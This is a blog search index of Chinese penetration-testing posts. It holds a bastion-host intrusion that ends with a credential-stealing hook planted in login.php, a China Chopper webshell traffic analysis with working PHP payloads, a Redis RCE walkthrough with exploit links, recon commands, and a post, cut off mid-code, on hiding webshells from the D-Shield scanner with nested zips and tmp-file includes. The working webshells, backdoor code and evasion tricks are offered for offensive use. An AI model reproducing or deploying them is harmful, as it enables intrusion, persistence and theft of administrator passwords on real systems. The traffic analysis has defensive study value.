<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>某堡垒机的明文密码获取</title>
      <link href="/2020/09/07/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/"/>
      <url>/2020/09/07/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<p>在一次进行内网渗透的过程中发现目标使用了某品牌的堡垒机，直接找公开漏洞</p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image002.jpg" alt="img"></p><p>直接利用CNVD-2019-20835对目标进行getshell。</p><p>查看版本 2.6.32 可以直接用脏牛漏洞进行提权，使用的数据库是postgres，直接导出吧。</p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image004.jpg" alt="img"></p><p>通过查询导出后的hash和阅读代码发现数据库存储密码使用了sha1(password+Salt)的方式进行存储，加上堡垒机的密码设置规则一般不少于8位数的数字+字母+特殊字符 用这种方式获取能登录的账户密码基本无解。</p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image006.jpg" alt="img"></p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image008.jpg" alt="img"></p><p>代码使用的是PM9SCREW加密过的，解密脚本 </p><p><a href="https://github.com/firebroo/screw_decode" target="_blank" rel="noopener">https://github.com/firebroo/screw_decode</a> </p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image010.jpg" alt="img"></p><p>解密PM9SCREW要满足2个条件，一个就是获得PM9SCREW所使用的编码可以从加密的php文件开头获取到，还有一个就是所使用的pm9screw_mycryptkey 这个需要对php_screw.so进行逆向获取。</p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image012.jpg" alt="img"></p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image014.jpg" alt="img"></p><p>转换为10进制就是45456, 52453, XXXXXXXXXXXXXXXXXXXX，不知道是不是每个厂商是特定的一串key 还是打一下码害怕找上门。</p><p>用github上下载下来的代码替换一下key，重新编译一下就好了</p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image016.jpg" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./decode shterm/</span><br><span class="line">find . -name &quot;*.php&quot; | xargs rm -rf</span><br><span class="line">find . -name &apos;*.php.decode&apos; | awk -F &quot;.&quot; &apos;&#123;print $2&#125;&apos; | xargs -i -t mv ./&#123;&#125;.php.decode ./&#123;&#125;.php</span><br></pre></td></tr></table></figure><p>依次执行一下 就能获得解密后的代码了。</p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image018.jpg" alt="img"></p><p>接下来的思路就是怎么获取明文密码了，我的思路就是在login.php插入记录用户名和账号密码的流量记录脚本。</p><p>修改一下以前打CTF时用过的脚本</p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image020.jpg" alt="img"></p><p>在login.php文件里包含一下这个文件.</p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image022.jpg" alt="img"></p><p>还要对login.php文件进行加密, <a href="https://github.com/Luavis/php-screw" target="_blank" rel="noopener">https://github.com/Luavis/php-screw</a></p><p>直接替换一下my_screw.h 里面的key到tools目录下直接编译就好了。</p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image024.jpg" alt="img"></p><p>直接到服务器替换login.php就OK了</p><p>几天后………</p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image026.jpg" alt="img"></p><p>抓到的POST数据包，password字段也是经过加密的</p><p>看一下login.php发现是用了rc4加密 直接用里面的代码进行解密就得到明文了</p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image028.jpg" alt="img"></p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image029.png" alt="img"></p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image031.jpg" alt="img"></p><p>经过大佬的提醒，刚刚看了一下密码是直接存储在session文件里面的，这样的话就不用搞那么多花样了直接看session文件</p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image002-1599463918708.jpg" alt="img"></p><p><img src="/images/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/clip_image003.jpg" alt="img"></p><p>读代码一定要先读完再去考虑怎么做…</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>caidao流量分析</title>
      <link href="/2019/08/01/caidao%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2019/08/01/caidao%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="请求包一"><a href="#请求包一" class="headerlink" title="请求包一"></a>请求包一</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (PHP_VERSION &lt; <span class="string">'5.3.0'</span>) &#123;@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line">$D = dirname(<span class="keyword">__FILE__</span>);</span><br><span class="line">$R = <span class="string">"&#123;$D&#125;\t"</span>;</span><br><span class="line"><span class="keyword">if</span> (substr($D, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">"/"</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(range(<span class="string">"A"</span>, <span class="string">"Z"</span>) <span class="keyword">as</span> $L) <span class="keyword">if</span> (is_dir(<span class="string">"&#123;$L&#125;:"</span>)) $R. = <span class="string">"&#123;$L&#125;:"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$R. = <span class="string">"\t"</span>;</span><br><span class="line">$u = (function_exists(<span class="string">'posix_getegid'</span>)) ? @posix_getpwuid(@posix_geteuid()) : <span class="string">''</span>;</span><br><span class="line">$usr = ($u) ? $u[<span class="string">'name'</span>] : @get_current_user();</span><br><span class="line">$R. = php_uname();</span><br><span class="line">$R. = <span class="string">"(&#123;$usr&#125;)"</span>;</span><br><span class="line"><span class="keyword">print</span> $R;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>@ ini_set(“display_errors”, “0”)关闭PHP的错误显示<br>@set_time_limit(0)     设置程序的执行时间，应该是为了放在上传文件，执行命令回显超时等问题。<br>if (PHP_VERSION &lt; ‘5.3.0’) {@set_magic_quotes_runtime(0);};版本大于5.3.0就关闭，当传输的POST或者get数据存在反斜杆（\）、单引号（’）、双引号（”）等特殊字符是就自动加上(斜杠)。<br>echo(“X@Y”);用于反caidao返回数据的中定位用的，如X@Y12345X@Y,那么caidao就读出内容为12345,<br>if (substr($D, 0, 1) != “/“) {<br>    foreach(range(“A”, “Z”) as $L) if (is_dir(“{$L}:”)) $R. = “{$L}:”;<br>}<br>获取网站的绝对路径以及存在多少个盘.<br>$u = (function_exists(‘posix_getegid’)) ? @posix_getpwuid(@posix_geteuid())<br>获取当前进程的用户名，这个好像posix_geteuid()好像只有在linux下才有效<br>$usr = ($u) ? $u[‘name’] : @get_current_user();<br>获取执行脚本权限的用户名，比如www，system。<br>php_uname();返回了运行 PHP 的操作系统的描述</p><p>##请求包二</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (PHP_VERSION &lt; <span class="string">'5.3.0'</span>) &#123;@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line">$D = <span class="string">'D:\\www\\security\\'</span>;</span><br><span class="line">$F = @opendir($D);</span><br><span class="line"><span class="keyword">if</span> ($F == <span class="keyword">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"ERROR:// Path Not Found Or No Permission!"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $M = <span class="keyword">NULL</span>;</span><br><span class="line">    $L = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> ($N = @readdir($F)) &#123;</span><br><span class="line">        $P = $D.<span class="string">'/'</span>.$N;</span><br><span class="line">        $T = @date(<span class="string">"Y-m-d H:i:s"</span>, @filemtime($P));@$E = substr(base_convert(@fileperms($P), <span class="number">10</span>, <span class="number">8</span>), <span class="number">-4</span>);</span><br><span class="line">        $R = <span class="string">"\t"</span>.$T.<span class="string">"\t"</span>.@filesize($P).<span class="string">"\t"</span>.$E.<span class="string">"\n"</span>;</span><br><span class="line">        <span class="keyword">if</span> (@is_dir($P)) $M. = $N.<span class="string">"/"</span>.$R;</span><br><span class="line">        <span class="keyword">else</span> $L. = $N.$R;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $M.$L;@closedir($F);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>@date(“Y-m-d H:i:s”, @filemtime($P));<br>获取“D:\www\security\”下的文件时间<br>@$E = substr(base_convert(@fileperms($P), 10, 8), -4)<br>文件权限以八进制的形式进行返回 如0777，0666</p><h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (PHP_VERSION &lt; <span class="string">'5.3.0'</span>) &#123;@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line">$F = <span class="string">'D:\\www\\security\\2008.php'</span>;</span><br><span class="line">$P = @fopen($F, <span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">echo</span>(@fread($P, filesize($F)));@fclose($P);;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>$P = @fopen($F, ‘r’);<br>echo(@fread($P, filesize($F)));@fclose($P);;<br>打开需要读取的文件，获取文件大小然后进行读取，读取完成后关闭打开的文件</p><h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (PHP_VERSION &lt; <span class="string">'5.3.0'</span>) &#123;@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line">$F = <span class="string">"D:\\www\\security\\2008.php"</span>;</span><br><span class="line">$fp = @fopen($F, <span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span> (@fgetc($fp)) &#123;@fclose($fp);@readfile($F);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">'ERROR:// Can Not Read'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>使用fgetc（）函数判断文件是不是空的，是空的话跳过，不是空则用@readfile()进行读取并且下载</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (PHP_VERSION &lt; <span class="string">'5.3.0'</span>) &#123;@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line">$f = <span class="string">'D:\\www\\security\\php.php'</span>;</span><br><span class="line">$c = $_POST[<span class="string">"z1"</span>];</span><br><span class="line">$c = str_replace(<span class="string">"\r"</span>, <span class="string">""</span>, $c);</span><br><span class="line">$c = str_replace(<span class="string">"\n"</span>, <span class="string">""</span>, $c);</span><br><span class="line">$buf = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($c); $i += <span class="number">2</span>) $buf. = urldecode(<span class="string">'%'</span>.substr($c, $i, <span class="number">2</span>));</span><br><span class="line"><span class="keyword">echo</span>(@fwrite(fopen($f, <span class="string">'w'</span>), $buf) ? <span class="string">'1'</span>: <span class="string">'0'</span>);;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&amp;z1=<span class="number">6161</span></span><br></pre></td></tr></table></figure><p>for ($i = 0; $i &lt; strlen($c); $i += 2) $buf. = urldecode(‘%’.substr($c, $i, 2));<br>echo(@fwrite(fopen($f, ‘w’), $buf) ? ‘1’: ‘0’);<br>&amp;z1=6161的值为16进制编码，把文件上次内容进行16进制编码然后使用urldecode进行16进制的解码，然后写入文件.</p><h2 id="虚拟终端"><a href="#虚拟终端" class="headerlink" title="虚拟终端"></a>虚拟终端</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (PHP_VERSION &lt; <span class="string">'5.3.0'</span>) &#123;@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line">$m = get_magic_quotes_gpc();</span><br><span class="line">$p = <span class="string">'cmd'</span>;</span><br><span class="line">$s = <span class="string">'cd /d D:\\www\\security\\&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]'</span>;</span><br><span class="line">$d = dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">$c = substr($d, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"/"</span> ? <span class="string">"-c \"&#123;$s&#125;\""</span>: <span class="string">"/c \"&#123;$s&#125;\""</span>;</span><br><span class="line">$r = <span class="string">"&#123;$p&#125; &#123;$c&#125;"</span>;</span><br><span class="line">$array = <span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>), <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>), <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>));</span><br><span class="line">$fp = proc_open($r.<span class="string">" 2&gt;&amp;1"</span>, $array, $pipes);</span><br><span class="line">$ret = stream_get_contents($pipes[<span class="number">1</span>]);</span><br><span class="line">proc_close($fp);</span><br><span class="line"><span class="keyword">print</span> $ret;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>dirname($_SERVER[“SCRIPT_FILENAME”]获取当前可执行脚本的路径部分，如echo dirname(“C:/testweb/home.php”); 返回C:/testweb/<br>$c = substr($d, 0, 1) == “/“ ? “-c &quot;{$s}&quot;“: “/c &quot;{$s}&quot;“;判断获取到的路径是不是/开头的如果是则执行 /bin/sh -c “whoami”如果不是则会执行cmd /c “whoami”<br>/bin/sh 一般为/bin/<br>/bin/sh 相当于 /bin/bash –posix<br>/bin/sh -c “参数”如何不加-c参数，则shell会进入一个交互式的shell<br>Cmd /c “参数”执行完指定命令后然后终止</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Redis_Rce</title>
      <link href="/2019/07/10/Redis-Rce/"/>
      <url>/2019/07/10/Redis-Rce/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>docker pull redis</p><p><img src="/images/pasted-19.png" alt="upload successful"></p><p>Docker run -d redis</p><p><img src="/images/pasted-20.png" alt="upload successful"></p><p>Docker run -it redis /bin/bash</p><p><img src="/images/pasted-21.png" alt="upload successful"></p><p> docker inspect 9f5946f764b9 | grep IPAddress</p><p><img src="/images/pasted-22.png" alt="upload successful"></p><p> <a href="https://github.com/jas502n/Redis-RCE" target="_blank" rel="noopener">https://github.com/jas502n/Redis-RCE</a></p><p><img src="/images/pasted-23.png" alt="upload successful"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>文章<a href="https://paper.seebug.org/975/" target="_blank" rel="noopener">https://paper.seebug.org/975/</a></p><p><img src="/images/pasted-24.png" alt="upload successful"></p><p>看这张图就懂了</p><h2 id="漏洞参考"><a href="#漏洞参考" class="headerlink" title="漏洞参考"></a>漏洞参考</h2><p><a href="https://paper.seebug.org/975/" target="_blank" rel="noopener">https://paper.seebug.org/975/</a></p><h2 id="漏洞EXP"><a href="#漏洞EXP" class="headerlink" title="漏洞EXP"></a>漏洞EXP</h2><p><a href="https://github.com/LoRexxar/redis-rogue-server" target="_blank" rel="noopener">https://github.com/LoRexxar/redis-rogue-server</a><br><a href="https://github.com/jas502n/Redis-RCE" target="_blank" rel="noopener">https://github.com/jas502n/Redis-RCE</a><br><a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener">https://github.com/n0b0dyCN/redis-rogue-server</a><br><a href="https://github.com/RicterZ/RedisModules-ExecuteCommand" target="_blank" rel="noopener">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集小技巧</title>
      <link href="/2019/07/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
      <url>/2019/07/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p>分享一个最近公司大佬教的信息收集技巧感觉挺不错的，适合用于大型企业，护网信息收集</p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p>使用Sublist3r进行枚举枚举子域名</p><pre><code>python sublist3r.py -d dingtalk.com -b -t 50 -o dingtalk.com.txt</code></pre><p><img src="/images/pasted-13.png" alt="upload successful"></p><h2 id="Ip段资产收集"><a href="#Ip段资产收集" class="headerlink" title="Ip段资产收集"></a>Ip段资产收集</h2><p>使用BASH脚本把域名解析成IP，并且去重加C段识别</p><pre><code>for i in `cat dingtalk.com.txt`;do host $i|grep -E -o &quot;([0-9]{1,3}[\.]){3}[0-9]{1,3}&quot;;done &gt;ips.txt</code></pre><p><img src="/images/pasted-14.png" alt="upload successful"></p><pre><code>cat ips.txt |sort|uniq|grep -E -o &quot;([0-9]{1,3}[\.]){3}&quot;|uniq -c|awk &apos;{if($1&gt;=2)print $2&quot;0/24&quot;}&apos; &gt; ip.txt</code></pre><p><img src="/images/pasted-15.png" alt="upload successful"></p><p>对于大公司的IP段的信息收集可以使用<a href="https://bgp.he.net" target="_blank" rel="noopener">https://bgp.he.net</a></p><p><img src="/images/pasted-16.png" alt="upload successful"></p><p>利用前面获取到的IP段，可以用nmap，masscan进行端口扫描，这里用到了一个nmap的的模板nmap-bootstrap.xsl，这个模板需要自行下载：<a href="https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl" target="_blank" rel="noopener">https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl</a></p><p>nmap -iL ip.txt -sS -T4 -A -sC -oA scanme xsltproc -o scanme.html nmap-bootstrap.xsl scanme.xml<br>（扫描完打开scanme.html文件可能会是xml格式的，使用xsltproc -o scanme.html nmap-bootstrap.xsl scanme.xml进行转换）</p><p><img src="/images/pasted-17.png" alt="upload successful"></p><h2 id="WEB资产识别"><a href="#WEB资产识别" class="headerlink" title="WEB资产识别"></a>WEB资产识别</h2><p>WEB资产识别，使用EyeWitness <a href="https://github.com/FortyNorthSecurity/EyeWitness" target="_blank" rel="noopener">https://github.com/FortyNorthSecurity/EyeWitness</a></p><pre><code>python EyeWitness.py -f 目标.txt –web –active-scan –add-http-ports 80,81,88,443,888,2082,2083,3122,4848,6588,7000,7001,7002,7003,8000,8080,8081,8089,8090,8443,8500,8888,9000,9001,9200,9043,9080,10000,10051,50000 –addhttps-ports 443,8443,9043nmap -T4 -iL 目标.txt -oX scan.xml -p 80,81,88,443,888,2082,2083,3122,4848,6588,7000,7001,7002,7003,8000,8080,8081,8089,8090,8443,8500,8888,9000,9001,9200,9043,9080,10000,10051,50000 -Pn --open -npython EyeWitness.py -x scan.xml --web --no-dns --active-scan</code></pre><p><img src="/images/pasted-18.png" alt="upload successful"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>恢复更新啦</title>
      <link href="/2019/07/09/%E6%81%A2%E5%A4%8D%E6%9B%B4%E6%96%B0/"/>
      <url>/2019/07/09/%E6%81%A2%E5%A4%8D%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<p>反正没有人看。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>权限维持小技巧</title>
      <link href="/2018/08/05/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
      <url>/2018/08/05/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="利用压缩文件来隐藏WEBSHELL"><a href="#利用压缩文件来隐藏WEBSHELL" class="headerlink" title="利用压缩文件来隐藏WEBSHELL"></a>利用压缩文件来隐藏WEBSHELL</h1><p>分享几个用来隐藏WEBSHELL的小技巧。<br>把一句话木马压缩成a.zip文件<br><img src="/images/pasted-10.png" alt><br>使用D盾扫一下<br><img src="/images/pasted-11.png" alt><br>重新对a.zip再进行压缩，压缩成11.zip<br><img src="/images/pasted-12.png" alt><br>这下就识别不了。D盾只对第一层压缩包进行扫描，并不会对压缩包里的压缩包进行扫描,通过这个小技巧我们可以用来隐藏后门。<br>而已D盾还不会对PHP压缩包类进行报毒等操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&apos;zip&apos;]))&#123;</span><br><span class="line">if(isset($_GET[&apos;f&apos;]))&#123;</span><br><span class="line">$zipname=$_GET[&apos;zip&apos;];</span><br><span class="line">$f=$_GET[&apos;f&apos;];</span><br><span class="line">$zip = new ZipArchive; </span><br><span class="line">$res = $zip-&gt;open(&quot;$zipname&quot;); </span><br><span class="line">if ($res === TRUE) &#123; </span><br><span class="line">$zip-&gt;extractTo(&quot;$f&quot;);</span><br><span class="line">echo &apos;解压成功&apos;;</span><br><span class="line">&#125; else &#123; </span><br><span class="line">echo &apos;failed, code:&apos; . $res; </span><br><span class="line"> &#125; </span><br><span class="line"> $zip-&gt;close(); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>只需解压两次即可把shell解压出来。</p><h1 id="利用缓存目录来隐藏shell"><a href="#利用缓存目录来隐藏shell" class="headerlink" title="利用缓存目录来隐藏shell"></a>利用缓存目录来隐藏shell</h1><p>文件上传到缓存目录，在把文件移动到web目录前，利用文件包含来执行代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@$file = $_FILES[&apos;file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">if($file != NULL)</span><br><span class="line">@include($file);</span><br><span class="line">echo (&quot;&lt;form 